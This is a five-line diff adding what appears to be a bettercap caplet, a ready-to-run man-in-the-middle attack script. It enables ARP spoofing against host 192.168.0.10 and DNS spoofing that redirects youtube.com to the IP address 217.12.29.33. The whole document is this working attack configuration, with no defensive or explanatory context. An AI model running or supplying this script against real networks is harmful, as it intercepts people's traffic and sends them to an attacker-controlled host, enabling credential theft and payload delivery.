@@ -1,0 +1,5 @@
+set arp.spoof targets 192.168.0.10
+arp.spoof on
+set dns.spoof.domains youtube.com
+set dns.spoof.address 217.12.29.33
+dns.spoof on
